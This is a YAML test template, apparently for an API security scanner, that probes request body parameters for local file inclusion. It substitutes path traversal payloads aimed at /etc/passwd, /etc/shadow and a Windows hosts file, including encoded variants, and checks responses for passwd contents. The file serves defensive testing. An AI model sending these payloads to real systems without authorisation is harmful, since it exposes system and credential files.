@@ -1,0 +1,116 @@
+id: LFI_BY_PATH_TRAVERSAL_BODY_PARAM
+info:
+  name: "Local File Inclusion via Path Traversal in Body Parameters"
+  description: "Tests for Local File Inclusion vulnerabilities by injecting path traversal sequences into request body parameters."
+  details: >
+    "Path traversal via body parameters targets APIs that accept file paths or resource
+    identifiers in the request body. Parameters like filename, filepath, template,
+    document, resource, and src are common targets. Insufficient sanitization of these
+    parameters allows attackers to traverse the directory structure and read arbitrary files."
+  impact: "Disclosure of sensitive system files, application source code, database
+    connection strings, API keys, and private certificates, potentially leading to
+    full system compromise via credential extraction."
+  category:
+    name: LFI
+    shortName: LFI
+    displayName: Local File Inclusion
+  subCategory: LFI_BY_PATH_TRAVERSAL_BODY_PARAM
+  severity: HIGH
+  tags:
+    - OWASP top 10
+    - Business logic
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
+    - "https://cwe.mitre.org/data/definitions/22.html"
+  cwe:
+    - CWE-22
+    - CWE-73
+  cve:
+    - CVE-2021-41773
+    - CVE-2022-22963
+
+attributes:
+  nature: INTRUSIVE
+  plan: FREE
+  duration: FAST
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  method:
+    neq: "OPTIONS"
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+      - "root:x:"
+  or:
+    - request_payload:
+        for_one:
+          key:
+            regex: "^filename$|^filepath$|^file$|^path$|^template$|^document$|^resource$|^src$|^source$|^load$"
+          value:
+            datatype: string
+            extract: fileKey
+
+execute:
+  type: single
+  requests:
+    - req:
+        - modify_body_param:
+            fileKey: "../../../etc/passwd"
+        - modify_body_param:
+            fileKey: "../../../../etc/passwd"
+        - modify_body_param:
+            fileKey: "../../../etc/shadow"
+        - modify_body_param:
+            fileKey: "..%2F..%2F..%2Fetc%2Fpasswd"
+        - modify_body_param:
+            fileKey: "....//....//....//etc//passwd"
+        - modify_body_param:
+            fileKey: "/etc/passwd"
+        - modify_body_param:
+            fileKey: "C:\\Windows\\System32\\drivers\\etc\\hosts"
+
+validate:
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    contains_either:
+      - "root:x:"
+      - "root:0:0"
+      - "/bin/bash"
+      - "/bin/sh"
+      - "daemon:x:"
+      - "nobody:x:"
+      - "127.0.0.1"
+      - "localhost"
